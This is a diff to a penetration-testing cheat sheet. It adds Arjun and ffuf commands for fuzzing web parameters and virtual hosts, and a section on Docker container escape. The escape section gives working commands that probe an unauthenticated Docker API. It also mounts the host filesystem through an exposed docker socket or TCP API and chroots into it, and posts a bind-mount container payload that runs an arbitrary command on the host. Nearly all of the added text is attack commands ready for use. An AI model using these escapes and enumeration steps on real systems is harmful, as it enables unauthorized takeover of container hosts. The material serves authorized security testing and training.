@@ -581,6 +581,15 @@ export HTTP_PROXY=http://localhost:8080      # route HTTP CLI traffic through Bu
 export HTTPS_PROXY=https://localhost:8080    # route HTTPS CLI traffic through Burp
 ```
 
+#### Arjun
+
+```bash
+arjun -u http://<RHOST.TLD>/<PATH>                                        # discover GET parameters on one endpoint
+arjun -u http://<RHOST.TLD>/<PATH> -m POST                                # discover POST parameters on one endpoint
+arjun -u http://<RHOST.TLD>/<PATH> --headers "Cookie: <COOKIE>"           # discover parameters with session cookie
+arjun -i <URLS_FILE> -oT <OUTPUT_FILE>                                    # discover parameters across URL list
+```
+
 #### ffuf
 
 ```bash
@@ -588,9 +597,13 @@ export HTTPS_PROXY=https://localhost:8080    # route HTTPS CLI traffic through B
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST.TLD>/FUZZ --fs <NUMBER> -mc all          # fuzz directories while filtering size
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST.TLD>/FUZZ -mc 200,204,301,302,307,401    # fuzz directories by status code
 
+# Parameter fuzzing
+ffuf -u "http://<RHOST.TLD>/<PATH>?FUZZ=<VALUE>" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac    # fuzz GET parameter names and learn baseline noise
+
 # Subdomain/VHost
-ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://HOST.TLD -H "Host: FUZZ.HOST.TLD" -fs 0 -ac -fc 400,404,500    # fuzz virtual hosts
-ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST.TLD>" -fs 185                          # fuzz vhosts with color output
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://<RHOST.TLD> -H "Host: FUZZ.<RHOST.TLD>" -ac                          # fuzz virtual hosts with auto-calibration
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://<RHOST.TLD> -H "Host: FUZZ.<RHOST.TLD>" -fs 0 -ac -fc 400,404,500    # fuzz virtual hosts with filters
+ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST.TLD>" -fs 185                                # fuzz vhosts with color output
 
 # API fuzzing
 ffuf -u https://<RHOST.TLD>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412    # fuzz API endpoints
@@ -1070,6 +1083,40 @@ sudo /usr/sbin/apache2 -f <FILE>                         # read first line as ro
 ```bash
 capsh --print                        # show current Linux capabilities
 /usr/sbin/getcap -r / 2>/dev/null    # find files with capabilities
+```
+
+##### Docker / Container Escape
+
+```bash
+cat /proc/1/cgroup                                                                             # check for container cgroup context
+test -f /.dockerenv && echo "inside docker"                                                    # check for Docker marker file
+find / -name docker.sock 2>/dev/null                                                           # find mounted Docker socket
+ip route                                                                                       # identify default gateway from container
+cat /etc/hosts                                                                                 # review Docker host aliases and internal DNS
+curl -s http://<DOCKER_HOST>:2375/_ping                                                        # test unauthenticated Docker API
+curl -s http://<DOCKER_HOST>:2375/version                                                      # show Docker engine and API version
+curl -s http://<DOCKER_HOST>:2375/info                                                         # enumerate Docker host info
+curl -s "http://<DOCKER_HOST>:2375/containers/json?all=1"                                      # list all containers
+curl -s http://<DOCKER_HOST>:2375/images/json                                                  # list cached images
+docker -H unix:///var/run/docker.sock run --rm -it -v /:/host alpine chroot /host sh           # escape through mounted Docker socket
+docker -H tcp://<DOCKER_HOST>:2375 run --rm -it -v /:/host alpine chroot /host sh              # escape through exposed Docker API
+docker -H tcp://<DOCKER_HOST>:2375 run --rm -v /mnt/host/c:/host alpine ls /host/Users         # enumerate Windows host drive through WSL2
+```
+
+```bash
+cat > /tmp/docker-mount.json <<'EOF'                                                                                                             # write Docker API bind-mount payload
+{
+  "Image": "alpine:latest",
+  "Cmd": ["/bin/sh", "-c", "<COMMAND>"],
+  "HostConfig": {
+    "Binds": ["<HOST_PATH>:/mnt/host"]
+  }
+}
+EOF
+curl -s -X POST -H "Content-Type: application/json" -d @/tmp/docker-mount.json "http://<DOCKER_HOST>:2375/containers/create?name=<CONTAINER>"    # create container with host bind mount
+curl -s -X POST "http://<DOCKER_HOST>:2375/containers/<CONTAINER>/start"                                                                         # start bind-mount container
+curl -s "http://<DOCKER_HOST>:2375/containers/<CONTAINER>/logs?stdout=1&stderr=1" | strings                                                      # strip Docker log framing and print output
+curl -s -X DELETE "http://<DOCKER_HOST>:2375/containers/<CONTAINER>?force=1"                                                                     # remove bind-mount container
 ```
 
 ##### Wildcard Abuse
